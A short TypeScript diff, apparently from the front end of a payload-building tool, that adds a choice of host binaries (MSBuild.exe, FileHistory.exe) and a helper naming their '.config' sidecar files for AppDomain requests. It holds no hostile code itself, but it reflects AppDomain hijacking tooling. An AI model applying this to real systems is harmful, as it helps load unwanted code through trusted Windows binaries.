@@ -66,9 +66,19 @@ export interface PeMetadataReq {
   sign: boolean; cert_pem?: string
 }
 
+export type AppDomainHostBinary = 'MSBuild.exe' | 'FileHistory.exe'
+
 export interface AppDomainReq {
   clr_version?: string
   net_version?: string
+  host_binary?: AppDomainHostBinary
+}
+
+/** `.config` sidecar filename for an AppDomain host binary — single source of
+ *  truth, mirrors `template_engine::appdomain_config_filename` on the Rust side. */
+export function appdomainConfigFilename(host?: AppDomainHostBinary | string | null): string {
+  const h = (host && host.length > 0) ? host : 'MSBuild.exe'
+  return `${h}.config`
 }
 
 export interface StagedReq {
